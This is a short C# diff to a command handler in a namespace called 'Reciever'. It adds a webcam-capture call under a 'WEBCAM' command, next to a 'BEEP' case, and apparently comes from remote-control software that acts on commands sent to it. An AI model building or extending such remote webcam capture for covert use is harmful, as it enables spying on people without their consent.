@@ -148,6 +148,7 @@ namespace Reciever
                     break;
 
                 case "WEBCAM":
+                    Functions.Webcam.CaptureCam();
                     break;
 
                 case "BEEP":
